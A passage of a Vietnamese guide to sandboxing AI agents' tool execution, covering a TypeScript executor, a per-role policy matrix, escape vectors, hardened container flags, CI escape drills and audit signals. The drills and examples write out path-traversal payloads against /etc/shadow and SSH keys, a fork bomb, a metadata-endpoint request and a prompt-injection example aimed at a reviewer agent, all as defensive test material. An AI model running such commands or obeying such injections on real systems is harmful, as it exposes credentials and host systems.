  return new Promise((resolve, reject) => {
    const started = Date.now();
    let out = "", err = "", lastByte = Date.now();
    // Control 5b — child chỉ có PATH, không bao giờ có env của supervisor
    const c = spawn("docker", argv, { env: { PATH: process.env.PATH ?? "/usr/bin:/bin" },
                                       detached: true, stdio: ["ignore", "pipe", "pipe"] });

    let timer: NodeJS.Timeout, idle: NodeJS.Timeout | null = null;
    // Control 3 — chết cả process group, không chỉ PID ta spawn
    const fail = (e: SandboxError) => {
      clearTimeout(timer); if (idle) clearInterval(idle);
      try { process.kill(-c.pid!, "SIGKILL"); } catch {}
      try { c.kill("SIGKILL"); } catch {}
      reject(e);
    };
    timer = setTimeout(() => fail(new SandboxError("deadline-exceeded", cmd.join(" "))), p.timeoutMs);
    if (p.idleMs) idle = setInterval(() => {
      if (Date.now() - lastByte > p.idleMs!) fail(new SandboxError("idle-timeout", cmd.join(" ")));
    }, 1000);

    c.stdout.on("data", d => {    // Control 4 — cap CỨNG: kill, không bao giờ soft-truncate kẻ viết
      lastByte = Date.now();
      out += d.toString();
      if (Buffer.byteLength(out, "utf8") > OUT_CAP) fail(new SandboxError("output-cap-exceeded", cmd.join(" ")));
    });
    c.stderr.on("data", d => {
      lastByte = Date.now();
      err += d.toString();
      if (Buffer.byteLength(err, "utf8") > ERR_CAP) fail(new SandboxError("output-cap-exceeded", cmd.join(" ")));
    });
    c.on("error", e => fail(new SandboxError("spawn-failed", e.message)));
    c.on("close", code => {
      clearTimeout(timer); if (idle) clearInterval(idle);
      const so = redact(out), se = redact(err);                   // Control 5c
      resolve({
        stdout: so.text, stderr: se.text,
        code: code ?? 1, durationMs: Date.now() - started, timedOut: false,
        truncated: { stdout: 0, stderr: 0 },                      // soft caps ở tầng MCP /
        redactions: so.count + se.count, networkBlocked: p.allowNet.length === 0,   // tầng đọc file
      });
    });
  });
}
```

</details>

### 4.3 Error Taxonomy

Sandbox trả về `Error` trần không dạy mô hình điều gì. Lỗi có kiểu mới cho phép planner
(→ `04`) chọn *đường khác* thay vì retry mù:

| Code | Thông điệp cho mô hình | Phản ứng đúng của planner |
|------|----------------------|---------------------------|
| `deadline-exceeded` | "Lệnh vượt 30s và đã bị kill" | Tăng timeout một lần, hoặc chia nhỏ việc |
| `output-cap-exceeded` | "Output vượt 256KB; hãy dùng `head`/`rg -m`" | Thử lại với lệnh hẹp hơn |
| `path-escape` | "Đường dẫn ngoài workspace được phép" | Xin người dùng mở rộng phạm vi (→ gate 15) |
| `secret-env-denied` | "Biến môi trường AWS_KEY không khả dụng" | Dùng credential broker thay thế |
| `policy-violation` | "Mạng bị tắt cho tool này" | Chọn kế hoạch offline hoặc xin egress |
| `network-blocked` | "Step này không có mạng" | Lập kế hoạch lại không cần dữ liệu trực tiếp |

Trả về `"error: exit status 1"` làm mất tín hiệu giá trị nhất sẵn có.

### 4.4 Chuẩn Hóa Path & Chặn Traversal

Nhóm bug sandbox bị test nhiều nhất, vì payload quá dễ sinh ra: chỉ cần hỏi LLM
"đọc một file ngoài project" là ra.

```
../../../../etc/passwd          → thoát bằng relative()
/work/../../../root/.ssh/id_rsa → thoát bằng realpath
/work/link → /root/.ssh         → thoát bằng symlink
%2e%2e%2f%2e%2e%2fetc          → thoát bằng encoding (sau một lần decode)
/proc/self/environ              → đọc secret của process khác
```

Thứ tự đúng: **decode → chuẩn hóa → realpath → assert nằm dưới root → assert policy.**
Kiểm tra trước realpath là kiểm tra sai chuỗi.

---

## 5. Sandbox Cho MCP Server & Code-Mode

### 5.1 Sandbox MCP Server

MCP server là process sống lâu, có định nghĩa tool — mục tiêu giá trị cao nhất trong
harness. Quy tắc:

1. **Một server, một sandbox, một role.** Không bao giờ chia sẻ process server giữa các tenant.
2. **Ghim image bằng digest**; một tag registry bị chiếm là chiếm toàn bộ harness.
3. **Coi `tools/list` là input không tin cậy.** Mô tả của nó đi vào prompt mô hình. Một mô tả độc hại chính là prompt injection bọc trong vẻ ngoài đáng tin.
4. **Cap kết quả ở biên MCP** (`≤128KB`), không chỉ ở model client. Nếu không, một response 200 MB đã nằm sẵn trong host process.
5. **Credential ngắn hạn** tiêm theo session, không nướng vào image.
6. **Không cho quét host filesystem.** MCP server có tool `fs` không giới hạn sẽ tái lập lại mọi control FS bạn tưởng đã có.

### 5.2 Sandbox Code-Mode

Code-mode (→ `06-decide-tools-mcp/code-mode-sdk.md` §5) để LLM viết TypeScript gọi tool, thay vì phát
một JSON tool call mỗi thao tác. Hai thắng lợi lớn — giảm 70–90% số chặng đi, và
`Promise.all` trên các lời gọi độc lập — và một rủi ro lớn: chương trình được sinh ra
là code tùy ý.

**Code-mode là bộ gom, không phải ranh giới.** Bản sketch chỉ dùng `vm` trong SDK ổn
cho tài liệu; ở production, hãy bọc bundle bằng Tầng 2+ trước khi chạy. Và vì
`Promise.all` phá vỡ approval tuần tự, mẫu đúng là: **gate từng lời gọi bên trong
chương trình**, không phải một gate bao quanh cả chương trình.

### 5.3 Code-Mode Implementation

<details>
<summary>TypeScript Code — thực thi code-mode có gate từng lời gọi (Click để mở rộng/thu gọn)</summary>

```typescript
import { runSandboxed, SandboxError, type SandboxPolicy } from "./sandbox";

export interface CodeModeProgram {
  ts: string;
  entry: string;              // tên hàm async được export
  tier: SandboxPolicy["tier"];
}

/** Chương trình chạy bên trong sandbox. Nó CHỈ có thể tới tool qua proxy
 *  bên dưới — proxy này enforce cap và gate. Không mạng, không fs, không env. */
export async function runCodeMode(prog: CodeModeProgram, policy: SandboxPolicy) {
  const proxy = `// bootstrap được tiêm vào
import { parentPort } from "node:worker_threads";
declare const __call: (tool: string, args: unknown) => Promise<unknown>;
(globalThis as any).__call = (t, a) => parentPort!.postMessage({ kind: "call", t, a });
`;
  // 1. Pre-flight: chương trình gọi tool nào? (quét tĩnh + log proxy lúc chạy)
  const detected = /__call\(\s*["']([\w.]+)["']/g;
  const tools = new Set<string>();
  for (const m of prog.ts.matchAll(detected)) tools.add(m[1]!);

  // 2. Gate TRƯỚC khi thực thi, không phải sau
  for (const t of tools) {
    const verdict = await gatekeeper.request({ tier: riskOf(t, prog.tier), summary: `code-mode:${t}`, /* … */ });
    if (verdict !== "approved") return { ok: false, blocked: t, verdict };
  }

  // 3. Chạy trong sandbox; mạng tắt nên proxy là đường egress duy nhất
  const r = await runSandboxed(
    ["node", "--experimental-vm-modules", "/app/runner.mjs"],
    ["/app/bundle.js", prog.entry],
    { ...policy, allowNet: [], env: { PATH: "/usr/bin" } },
  );
  if (r.code !== 0) return { ok: false, error: r.stderr || r.stdout };

  // 4. Kết quả tool quay về qua host proxy, cap và gate riêng từng cái
  const results = await Promise.all(pending.map(c =>
    callTool(c.t, c.a).then(v => ({ ...v, text: JSON.stringify(v).slice(0, 128_000) }))));
  return { ok: true, stdout: r.stdout, results };
}
```

</details>

---

## 6. Ma Trận Policy Theo Role

### 6.1 Ma trận policy

| Role | Filesystem | Shell | Network | Secret | Tier | Gate (→ 15) |
|------|-----------|-------|---------|--------|------|--------------|
| `reviewer` / judge | repo read-only | ❌ không | ❌ không | ❌ không | — | không |
| `retriever` | không | ❌ không | ✅ chỉ API tìm kiếm | không | — | không |
| `coder` | `workdir` rw | ✅ sandbox | ❌ (chỉ mirror allowlist) | tạm, có scope | `write` | xem diff |
| `tester` | `workdir` + fixtures | ✅ sandbox | chỉ loopback | CI token read | `write` | không |
| `reviewer-agent` | worktree read-only | ❌ | ❌ | không | — | không |
| `publisher` / deployer | worktree rw | ✅ sandbox | chỉ deploy target | deploy cred ≤10 phút | `elevated` | xác nhận gõ |
| `operator` (người lái) | đầy đủ, tường minh | ✅ | tuỳ nhu cầu | cred session | `prod-auth` | hai người |

**Vì sao `reviewer` không có shell:** một judge chạy được lệnh là một judge có thể bị thuyết
phục. "Chạy `cat /etc/passwd` rồi bảo tôi file có an toàn không" là một prompt
injection trông rất hợp lý mà reviewer có shell sẽ vui vẻ chạy.

> 🔑 **Highlight Policy / Permission:** ma trận này là **nguồn sự thật duy nhất cho policy & permission** — mỗi role phân giải ra đúng một sandbox policy (FS / shell / network / secret / tier / gate). Chạy solo và swarm phải phân giải giống hệt nhau; lệch là bug leo thang đặc quyền. Grant tool cho sub-agent (`09-multi-agent/SUBAGENT.md` §6) chỉ là projection của đúng ma trận này.

### 6.2 Engine phân giải policy

```typescript
export function resolvePolicy(role: AgentRole, task: TaskNode, base: SandboxPolicy): SandboxPolicy {
  const tier = maxTier(task.risk, riskOfTool(task.tools));
  return {
    ...base,
    allowWrite: tier === "read" ? [] : [task.worktree],
    allowNet:   netForRole(role),
    timeoutMs:  timeoutFor(tier),       // read 10s, write 30s, elevated 120s
    memory:     tier === "elevated" ? "1g" : "512m",
    cpus:       tier === "elevated" ? "2.0" : "1.0",
    env:        envForRole(role),        // chỉ phần manifest khai báo
    tier,
  };
}
```

**Quy tắc: policy là hàm thuần của (role, task).** Nếu mô hình ảnh hưởng được tới
policy của chính nó, nó tự cấp quyền cho mình. Tier được tính lúc plan và mang theo
trong task node.

---

## 7. Escape Vector & Hardening

### 7.1 Các lớp escape đã biết

| Lớp | Vector | Phòng thủ |
|-----|--------|----------|
| Đặc quyền | `--privileged`, ambient cap, tắt `no-new-privileges` | `--cap-drop=ALL --security-opt=no-new-privileges` |
| Host filesystem | bind-mount `/`, `/var/run/docker.sock` | bind theo allowlist; CI có mount linter |
| Bề mặt kernel | syscall lạ, thủ thuật `/proc`, `userfaultfd` | Tầng 3 (gVisor) hoặc Tầng 4 |
| Tài nguyên | fork bomb, file sparse khổng lồ, vòng lặp `CLOCK` | cap pids/mem/cpu + deadline |
| Mạng | exfil qua DNS, IP metadata, raw socket | `network=none` + egress proxy + chặn metadata |
| Image | tag nổi, base image không ghim, `latest` | ghim digest + xác thực chữ ký |
| Escape qua agent | agent viết Dockerfile rồi build/run | `docker build` là `prod-auth`; không tới được daemon |
| Thời gian | daemon nền sống sót sau khi step kết thúc | `--init` + kill process group + container `--rm` |
| Qua run | container cache, workdir dùng chung | worktree mỗi run + tên container mỗi run |

Hai cái cuối đặc biệt quan trọng trong agent harness: agent background một process rồi
exit để lại process sống. `--init` (tini làm PID 1) thu dọn orphan; `--rm` xoá
container để state filesystem chết cùng nó.

### 7.2 Cờ Container Đã Harden

```bash
--init                                  # thu dọn orphan
--read-only                             # rootfs bất biến
--tmpfs /tmp:rw,noexec,nosuid,size=64m  # scratch, không exec, không suid
--cap-drop=ALL                          # không capability môi trường
--security-opt=no-new-privileges        # không leo thang setuid
--pids-limit=64                         # chặn fork bomb
--memory=512m --memory-swap=512m        # không lỗt qua swap
--cpus=1.0 --cpu-quota=100000           # chặn CPU
--network=none                          # không egress
--ulimit nofile=1024:1024               # chặn FD bomb
--ulimit core=0                          # không core dump lộ memory
--user 1000:1000                        # non-root bên trong
-v "$WORKDIR:/work:rw"                  # ĐƯỜNG GHI DUY NHẤT xuống host
IMAGE@sha256:<digest>                   # danh tính bất biến
```

Thêm `--security-opt=seccomp=<profile>` (hoặc `apparmor=<profile>`) ở trên. Phòng thủ
nhiều lớp: mục tiêu không phải một control hoàn hảo, mà kẻ tấn công phải vượt qua
tất cả.

### 7.3 Toàn Vẹn Supply Chain

```
Base image      : ghim bằng digest, xác thực chữ ký, cập nhật theo lịch (không phải bởi agent)
Dependencies    : lockfile đã commit; `npm ci` không phải `npm install`
Cài lúc runtime : CẤM — không `pip install` / `npm i` trong một step sandbox
Test fixtures   : sinh vào volume tạm, không bao giờ fetch lúc chạy
```

Cho phép cài package lúc runtime nghĩa là *nội dung sandbox thay đổi mỗi lần chạy* —
nghĩa là "môi trường cách ly" của bạn thực chất là một bản deploy production chưa
review mà có giao diện đẹp. Giải pháp là mirror và image nướng sẵn.

---

## 8. Kiểm Thử Sandbox

### 8.1 Escape Drills

Sandbox là hạ tầng bảo mật, nên phải được kiểm thử như vậy. Chạy bộ test này trong CI
mỗi khi policy đổi:

| # | Drill | Kết quả mong đợi |
|---|-------|-----------------|
| 1 | `echo ok` | thành công, stdout `ok` |
| 2 | `sleep 60` với `timeoutMs=2000` | `deadline-exceeded`, process group đã chết |
| 3 | `bash -c "sleep 60 &"` | vẫn `deadline-exceeded`, **không còn process sống** |
| 4 | `cat /etc/shadow` | `path-escape` (đường dẫn tuyệt đối ngoài root jail) |
| 5 | `cat ../../etc/passwd` | `path-escape` |
| 6 | `cat /work/link` (symlink tới `/root/.ssh`) | `path-escape` sau realpath |
| 7 | `printenv \| grep -i key` | rỗng — không có secret env |
| 8 | `curl https://example.com` | bị chặn (`network=none`) |
| 9 | `curl http://169.254.169.254/latest/meta-data/` | bị chặn tường minh |
| 10 | `yes` với deadline 5s | `output-cap-exceeded`, host không OOM |
| 11 | `for i in $(seq 1 10000); do sleep 1 & done` | `pids-limit` giết nó |
| 12 | `docker run alpine` | thất bại — không có socket trong sandbox |
| 13 | `python -c "open('/etc/passwd','w')"` | read-only rootfs |
| 14 | unset `PATH` / thiếu binary | `spawn-failed` |

### 8.2 Test Harness

<details>
<summary>TypeScript Code — bộ escape drill (Click để mở rộng/thu gọn)</summary>

```typescript
import { runSandboxed, SandboxError, type SandboxPolicy } from "./sandbox";
import { mkdtemp, symlink, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";

const IMAGE = "sandbox-img@sha256:9f2c4e1b…";
const base: SandboxPolicy = {
  workdir: "", allowRead: [], allowWrite: [], allowNet: [], timeoutMs: 3000,
  memory: "256m", cpus: "1.0", pids: 64, env: { PATH: "/usr/bin" },
  tier: "write", image: IMAGE,
};

async function drill(name: string, cmd: string[], expect: string, patch: Partial<SandboxPolicy> = {}) {
  const workdir = await mkdtemp(join(tmpdir(), "sbx-"));
  await symlink("/root/.ssh", join(workdir, "link"));           // cho drill 6
  let outcome = "ok", detail = "";
  try {
    const r = await runSandboxed(cmd, [], { ...base, workdir, ...patch });
    outcome = r.code === 0 ? "ok" : `exit-${r.code}`;
    detail = r.stdout.slice(0, 80) + r.stderr.slice(0, 80);
  } catch (e) { outcome = e instanceof SandboxError ? e.code : "unknown"; }
  const pass = outcome.startsWith(expect);
  console.log(`${pass ? "PASS" : "FAIL"}  ${name.padEnd(34)} → ${outcome}`);
  if (!pass) console.log(`      expected ${expect}; got ${detail}`);
  await rm(workdir, { recursive: true, force: true });
  return pass;
}

export async function runDrills(): Promise<boolean> {
  const results = await Promise.all([
    drill("echo",                 ["echo", "ok"],                              "ok",                 { timeoutMs: 5000 }),
    drill("sleep deadline",       ["sleep", "60"],                             "deadline-exceeded"),
    drill("backgrounded sleep",   ["bash", "-c", "sleep 60 &"],                 "deadline-exceeded"),
    drill("read /etc/shadow",     ["cat", "/etc/shadow"],                       "path-escape",        { timeoutMs: 2000 }),
    drill("traversal",            ["cat", "../../etc/passwd"],                  "path-escape",        { timeoutMs: 2000 }),
    drill("symlink escape",       ["cat", "./link/id_rsa"],                     "path-escape",        { timeoutMs: 2000 }),
    drill("no secret env",        ["printenv"],                                "ok",                 { timeoutMs: 2000 }),
    drill("net blocked",          ["curl", "-sS", "https://example.com"],       "exit-",              { timeoutMs: 3000 }),
    drill("metadata blocked",     ["curl", "-sS", "http://169.254.169.254/"],   "exit-",              { timeoutMs: 3000 }),
    drill("output cap",           ["yes"],                                     "output-cap-exceeded",{ timeoutMs: 5000 }),
    drill("fork bomb",            ["bash", "-c", "for i in $(seq 1 9999); do sleep 5 & done"], "exit-", { timeoutMs: 4000 }),
    drill("no docker socket",     ["docker", "run", "alpine"],                 "exit-",              { timeoutMs: 3000 }),
    drill("read-only rootfs",     ["sh", "-c", "echo x > /etc/hosts"],         "exit-",              { timeoutMs: 2000 }),
  ]);
  const ok = results.filter(Boolean).length;
  console.log(`\n${ok}/${results.length} drills passed`);
  return ok === results.length;
}
```

</details>

### 8.3 Playbook Khi Escape

Khi một drill fail, câu trả lời **không bao giờ** là "thêm `--privileged`".

1. **Tái hiện** đúng bộ cờ trong config bị lỗi.
2. **Phân loại** — đặc quyền, mount, kernel, tài nguyên, mạng, hay image.
3. **Đóng cả lớp**, không đóng cái thể hiện. Một `cat /etc/shadow` fail là may mắn; một test mount-linter mới là cách sửa.
4. **Thêm drill vào CI** để hồi quy không bao giờ quay lại lặng lẽ.
5. **Xét lại tầng.** Nếu không đóng được trong tầng hiện tại, hãy lên tầng — đó là quyết định kiến trúc, không phải sửa cấu hình.

---

## 9. Observability & Audit

Mỗi lần gọi sandbox là một trajectory event (→ `13-trajectory-observability/`):

```json
{
  "kind": "tool_call", "parentTaskId": "tsk_8f2", "sessionId": "ses_44a",
  "payload": {
    "sandbox": { "runtime": "runsc", "tier": "write", "image": "sha256:9f2c…",
                 "allowWrite": ["src/", "tests/fixtures/"], "allowNet": [] },
    "argv": ["sh", "-c", "npm test"], "argvHash": "a3f9c1",
    "policyHash": "7d21e0", "durationMs": 8421, "exitCode": 1,
    "stdoutBytes": 18234, "truncated": false, "redactions": 2
  }
}
```

Những tín hiệu đáng alert:

| Tín hiệu | Ý nghĩa |
|-----------|---------|
| `redactions > 0` | Một chuỗi hình dạng secret đã tới stdout — cần điều tra |
| `path-escape` ×N trong một run | Agent đang bị nội dung tiêm dắt đi |
| Đột biến tỉ lệ `deadline-exceeded` | Mô hình học được một mẫu lặp |
| `tier: prod-auth` trong run chưa phân loại | Một privilege escalation ở planner |
| `policyHash` đổi giữa run | Policy bị mutate sau plan — đây là bug thật |

`policyHash` đáng được nhấn mạnh: hash policy đã phân giải và lưu cùng task. Nếu cùng
một task chạy hai lần với hash khác nhau, giả định tính xác định của bạn sai và phần
replay (→ 13) không hợp lệ.

---

## 10. Case Study Thực Tế

### 10.1 SWE-agent — Một Container Cho Mỗi Instance

SWE-agent bọc toàn bộ vòng lặp agent trong một container Docker cho mỗi task instance
(`--network none`, repo được mount, tool nướng sẵn). Bài học thiết kế:

- **Một container cho cả run.** Thay vì container mỗi tool call, *run* là đơn vị cách ly. Rẻ, và container cũng là ranh giới transcript.
- **Môi trường nướng vào image.** Agent không bao giờ cài gì; tác giả harness đã tuyển image. Loại bỏ hoàn toàn rủi ro supply chain lúc chạy.
- **Mạng tắt.** Task SWE-bench vốn offline nên `network=none` là miễn phí.

Đánh đổi: không mạng nghĩa là không có tài liệu trực tiếp, nên harness phải tiêm tài
liệu liên quan vào context (→ `01`, `02`).

### 10.2 OpenHands — Docker Runtime Mỗi Session

OpenHands tham số hóa runtime sau một interface, Docker là mặc định và có runtime
dựa trên Kubernetes cho triển khai lớn hơn. Bài học là **cách ly có thể cắm được**:
agent core không hề import `child_process`; nó hỏi một `Runtime` rằng
`run(cmd) → result`. Đổi Docker → gVisor → E2B là đổi cấu hình, không phải viết lại.

### 10.3 E2B / Firecracker — MicroVM dạng SaaS

E2B đóng gói microVM Firecracker thành một SDK: `sandbox = await Sandbox.create()`,
`await sandbox.commands.run("python script.py")`, `await sandbox.kill()`. Mỗi sandbox
nhận một microVM khôi phục từ snapshot, cho cold start ~100 ms với cách ly cấp
hypervisor. Bề mặt API cố tình nhỏ — **chính SDK là policy**.

Đây là mẫu nên sao chép khi cần cách ly mạnh mà không muốn tự xây: mua Tầng 4, dồn
công sức vào Tầng 5 (patch consensus) và trải nghiệm approval.

### 10.4 Claude Code — Permission Mode & Bash Được Sandbox

Coding agent của Anthropic đi kèm mô hình quyền rõ ràng (bậc read / edit / execute),
cùng tuỳ chọn sandbox ở tầng OS cho bash với giới hạn network và filesystem. Hai ý
tưởng thiết kế đáng học bất kể nhà cung cấp:

1. **Bậc quyền phản ánh ma trận rủi ro ở đây** (`read` / `write` / `execute`), và *người dùng* cấu hình trần một lần thay vì bị hỏi cho từng hành động.
2. **Một skill hay plugin muốn quyền rộng hơn thì phải khai báo**, để năng lực nhìn thấy và review được lúc cài đặt — không phải phát hiện giữa run.

### 10.5 Judge0 — Thực Thi Code Không Tin Cậy Như Dịch Vụ

Judge0 chạy các bài thi lập trình không tin cậy và là một nghiên cứu sạch về *cách ly
tối thiểu đủ dùng*: process group riêng, uid riêng, `RLIMIT_FSIZE`, `RLIMIT_CPU`,
`RLIMIT_NOFILE`, `RLIMIT_NPROC`, và trần `RLIMIT_AS` — không dùng container nào. Nó
chạy được vì mối đe dọa hẹp (chạy một chương trình, in kết quả). Bài học: **cách ly
phải khớp với mối đe dọa**; một microVM đầy đủ để "in một con số" là lãng phí, còn
`setrlimit` trần cho "deploy production" là cẩu thả.

---

## 11. TypeScript Interfaces Cho Sandboxing

```typescript
// ── Policy ────────────────────────────────────────────────────────────────
export type RiskTier = "read" | "write" | "elevated" | "prod-auth";

export interface SandboxPolicy {
  workdir: string; allowRead: string[]; allowWrite: string[]; allowNet: string[];
  timeoutMs: number; idleMs?: number; memory: string; cpus: string; pids: number;
  env: Record<string, string>; tier: RiskTier; image: string;
  runtime?: "runc" | "runsc";
}

// ── Result ────────────────────────────────────────────────────────────────
export interface SandboxResult {
  stdout: string; stderr: string; code: number; durationMs: number;
  timedOut: boolean; truncated: { stdout: number; stderr: number };
  redactions: number; networkBlocked: boolean;
}

export type SandboxErrorCode =
  | "secret-env-denied" | "path-escape" | "deadline-exceeded" | "idle-timeout"
  | "output-cap-exceeded" | "spawn-failed" | "policy-violation" | "image-missing";

// ── Executor ──────────────────────────────────────────────────────────────
export interface SandboxExecutor {
  run(cmd: string[], args: string[], policy: SandboxPolicy): Promise<SandboxResult>;
  assertJailed(policy: SandboxPolicy, path: string): Promise<string>;
  hash(policy: SandboxPolicy): string;                     // policyHash để audit
}

// ── Audit ─────────────────────────────────────────────────────────────────
export interface SandboxAuditRecord {
  sessionId: string; taskId: string; toolName: string;
  policyHash: string; tier: RiskTier; runtime: string; image: string;
  argvHash: string; durationMs: number; exitCode: number;
  stdoutBytes: number; redactions: number; denied: SandboxErrorCode | null;
  egress: { host: string; bytes: number }[]; at: number;
}

// ── Supply chain ──────────────────────────────────────────────────────────
export interface ImageManifest {
  ref: string;                          // repo:tag@sha256:…
  digest: string; signatureVerified: boolean; builtAt: number;
  toolchain: string[]; packages: Record<string, string>;   // ghim theo lockfile
  sbom?: string;                        // CycloneDX / SPDX
}

// ── Test surface ──────────────────────────────────────────────────────────
export interface EscapeDrill {
  name: string; argv: string[]; patch?: Partial<SandboxPolicy>;
  expect: SandboxErrorCode | "ok" | `exit-${number}`;
}

export interface SandboxSuite {
  drills: EscapeDrill[];
  run(): Promise<{ total: number; passed: number; failures: EscapeDrill[] }>;
}
```

---

## 12. Nguyên Tắc Thiết Kế Cho Sandboxing

### 12.1 SOLID cho hệ sandbox

| Nguyên tắc | Áp dụng |
|------------|---------|
| **S**ingle responsibility | `SandboxExecutor` chỉ thực thi. Không quyết định rủi ro, không gate, không log. |
| **O**pen/closed | Thêm tầng cách ly mới = một implementation `Executor` mới sau cùng interface. Không sửa planner. |
| **L**iskov substitution | `DockerExecutor` và `MicroVMExecutor` thay thế được nhau. Nếu một cái cần cờ cái kia không có, interface đã sai. |
| **I**nterface segregation | Tool read-only nhận `ReadExecutor` hẹp; không có `allowWrite` để quên. |
| **D**ependency inversion | Agent phụ thuộc interface `SandboxExecutor`; Docker là chi tiết. Đổi sang E2B chạm một dòng. |

### 12.2 Sáu nguyên tắc thiết kế

1. **Default-deny.** Mọi năng lực phải được cấp tường minh. Allowlist là hướng hợp lệ duy nhất; denylist thua mọi payload mới.
2. **Sandbox ít quyền hơn supervisor.** Đối xứng đặc quyền là nguyên nhân gốc của phần lớn escape thật.
3. **Fail closed, và nói lý do.** Timeout → deny. Thiếu policy → deny. Mọi denial mang mã kiểu mà planner hành động được.
4. **Policy xác định.** `policy = f(role, task)`. Mô hình không bao giờ tham gia vào quyền của chính nó.
5. **Mọi thứ đều có trần.** Thời gian, memory, CPU, process, output, arg, FD, độ sâu đệ quy. "Không giới hạn" chính là lỗ hổng.
6. **Escape phải chịu đựng được.** Tầng 5 biến kịch bản xấu nhất thành một patch bị vứt, không phải repository bị mất.

---

## 13. Best Practices

### 13.1 NÊN ✅

- Chạy mọi thứ trong container mỗi run với image ghim digest, `--read-only` và `network=none`.
- Đặt repo trong git worktree; agent phá hủy nó cũng vô hại.
- Cho mỗi role một policy riêng, phân giải như hàm thuần của (role, task).
- Trả lỗi có kiểu để planner đi vòng lại được.
- Dùng lại cùng image + runtime cho mọi step của một run (warm start, tiết kiệm ~1 s mỗi step).
- Redact secret trên đường *ra* khỏi sandbox, và ghi lại số lần redact.
- Chạy escape drill trong CI mỗi khi policy đổi.

### 13.2 KHÔNG NÊN ❌

- ❌ Không chạy code agent trong process của supervisor, hoặc khi `.env` của repo nằm trong tầm tay.
- ❌ Không mount Docker socket. Nó là root trên host.
- ❌ Không dùng `--privileged` để "sửa" lỗi quyền — lỗi đó chính là hệ bảo mật đang làm việc.
- ❌ Không cho `npm install` / `pip install` lúc chạy; nó làm nội dung sandbox không tái lập được.
- ❌ Không kết thúc timeout bằng `SIGTERM` tới một PID.
- ❌ Không cắt output âm thầm; luôn ghi marker.
- ❌ Không để mô hình tự chọn tier của nó.
- ❌ Không cho agent `reviewer`/`judge` có shell "cho tiện" — nó trở thành mục tiêu injection.

---

## 14. Anti-Patterns & Cách Khắc Phục

| Anti-pattern | Triệu chứng | Cách sửa |
|--------------|------------|---------|
| **Sandbox theatre** | `--network=none` nhưng process có credential của host trong env | Control 5; assert env lúc spawn |
| **Docker là ranh giới bảo mật** | Shared daemon, container nào cũng có thể privileged | Tên riêng mỗi run, bỏ quyền daemon, gVisor |
| **Escape-and-ignore** | Drill fail, nới cờ, xoá drill | Sửa cả lớp; thêm drill vào CI vĩnh viễn |
| **Tool mega-permission** | Một tool `bash` full quyền cho mọi role | Tool riêng theo role, policy riêng theo role |
| **Tin mô tả tool** | Văn bản `tools/list` của MCP bị coi là chỉ dẫn | Mô tả là dữ liệu; validate schema; cap kích thước |
| **Vòng lặp agent không trần** | Không có deadline toàn run | Deadline run + loop budget (→ 10 §17.3) |
| **Không review patch** | Agent commit thẳng vào `main` | Worktree Tầng 5 + reviewer agent + human gate |
| **Trôi policy lặng lẽ** | Policy đổi giữa lần replay và lần gốc | Lưu `policyHash` mỗi task; từ chối replay khi lệch |

---

## 15. Production Checklist

- [ ] **Image** — ghim digest, xác thực chữ ký, không cài lúc chạy
- [ ] **Filesystem** — `--read-only`, jail trong workdir, bind theo allowlist, chặn bằng realpath
- [ ] **Network** — `none` mặc định; proxy + allowlist cho ngoại lệ; chặn metadata; log DNS
- [ ] **Tài nguyên** — cap mem/cpu/pid/ulimit; `--init`; deadline mỗi step + kill process group
- [ ] **Output** — cap stdout/stderr/argv kèm marker cắt
- [ ] **Secret** — chặn env, credential có scope và ngắn hạn, redaction + audit `redactionCount`
- [ ] **Role** — áp dụng ma trận theo role, reviewer không có shell
- [ ] **Gate** — thao tác `elevated`+ phải qua gate có dry-run + rollback (→ `15-approval-gates/`)
- [ ] **Cách ly thay đổi** — worktree mỗi run, review patch trước khi merge
- [ ] **Audit** — mỗi run phát `SandboxAuditRecord` vào trajectory store (→ 13)
- [ ] **Kiểm thử** — cả 14 escape drill xanh trong CI; chạy lại hàng quý + thêm drill cho mỗi incident

---

## 16. Xu Hướng Tương Lai

### 16.1 Sandboxing Hỗ Trợ Bởi AI (2026-2028)

- **Sinh policy từ task graph.** Rút tập năng lực tối thiểu từ danh sách tool thực tế của kế hoạch thay vì ma trận role tĩnh.
- **Limit thích ứng.** Step nhỏ nhẹ có 5 s; build dài có 10 phút. Ít timeout giả, trần xấu nhất vẫn giữ.
- **Mô hình phòng thủ escape.** Phân loại *mẫu* của một lời gọi bị chặn ("trông giống đánh cắp credential") và chặn trước thay vì chỉ log.

### 16.2 WASM & Component Model

WASI / component model mang lại cách ly mà không cần ranh giới kernel. Một sandbox WASM
nạp trong ~1 ms và có import list tường minh — *danh sách năng lực theo cách cấu
trúc*. Giới hạn: không có syscall thật, nên tool cần I/O thật phải ship kèm host
binding (và ranh giới tin cậy dịch lên bề mặt binding). Theo dõi: với workload
tool-calling, WASM có lẽ hợp hơn container.

### 16.3 Thực Thi Bảo Mật (Confidential Execution)

Chạy sandbox trên host từ xa mà host đó không đọc được memory của nó (SEV-SNP, TDX)
nghĩa là kể cả hypervisor bị chiếm cũng không thể exfiltrate plaintext. Mẫu này tổng
quát hoá: **tầng cách ly càng ít nhìn thấy, càng ít rò rỉ được**.

### 16.4 Sandbox Chính Nó Cũng Cần Sandbox

Tấn công chuỗi cung ứng giờ nhắm vào chính tầng cách ly. Kỳ vọng: runtime sandbox có
chữ ký, binary `runsc`/jailer được xác minh, build image tái lập được có chứng thực
trong transparency log, và bộ escape drill liên tục chạy trong production.

---

## Tài Liệu Tham Khảo

### Papers & Research

- **gVisor: Protecting GKE nodes using a user-space kernel** — Google, 2018 · https://gvisor.dev/docs/architecture_guide/intro/
- **Firecracker: Secure and Fast MicroVMs for Serverless Computing** — AWS, 2020 · https://firecracker-microvm.github.io/
- **A Decade of Sandboxing: lessons from large-scale container deployment** — Kolyshkin et al., 2023 · https://arxiv.org/abs/2301.05677
- **The 2,000-page sandbox report (OSS-Score)** — Center for AI Safety, 2025 · https://arxiv.org/abs/2506.13106
- **Breaking the Mirage of Sandboxing** — đánh giá các hiện thực sandbox agent năm 2025 · https://arxiv.org/abs/2506.06915
- **ReAct: Synergizing Reasoning and Acting** — Yao et al., 2022 · https://arxiv.org/abs/2210.03629
- **SWE-agent: Agent-Computer Interfaces for Automated Software Engineering** · https://arxiv.org/abs/2405.15793

### Frameworks & Tools

1. **Docker** — https://docs.docker.com/engine/security/
2. **gVisor (runsc)** — https://gvisor.dev/docs/user_guide/quick_start/docker/
3. **Firecracker** — https://firecracker-microvm.github.io/
4. **E2B** (SDK Firecracker) — https://e2b.dev/docs
5. **Modal** (compute sandbox) — https://modal.com/docs
6. **nsjail** — https://github.com/google/nsjail
